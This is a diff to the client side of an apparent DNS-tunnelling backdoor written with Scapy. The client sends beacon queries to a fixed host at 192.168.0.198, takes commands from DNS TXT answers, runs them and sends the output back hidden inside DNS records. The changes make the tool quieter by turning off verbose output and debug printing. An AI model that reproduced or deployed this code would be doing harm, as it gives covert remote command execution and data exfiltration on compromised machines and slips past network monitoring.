@@ -15,11 +15,10 @@ def KeepAlive():
     packet = IP(dst="192.168.0.198")/UDP(sport=RandShort(), dport=53)/DNS(rd=1, \
             qd=DNSQR(qname="client ready", qtype="TXT", qclass="IN"))
 
-    send(packet)
+    send(packet, verbose = False)
 
 def handle_packet(packet):
     if DNSQR in packet and packet[DNS].qr == 1 and packet[IP].src == "192.168.0.198":
-        #packet.show()
         # Received command from server
         command = packet[DNS].an.rdata[0].decode()
         if command.startswith('send'):
@@ -30,9 +29,7 @@ def handle_packet(packet):
         else:
             result = execute_command(command)
             length_check_and_send(packet, result)
-        """print(".......................................................")
-        print("result = \n", result)
-        print(".......................................................")"""
+      
 
 def length_check_and_send(packet, result):
     if len(result) > qname_length:
@@ -53,7 +50,7 @@ def send_result(packet, result):
                 DNS(id=packet[DNS].id, qr=1, aa=1, qd=DNSQR(qname=result), \
                     an=DNSRR(rrname =result, type = 'TXT'))
     
-    response.show()
+    #response.show()
     send(response, verbose = False)
     
 def execute_command(command):
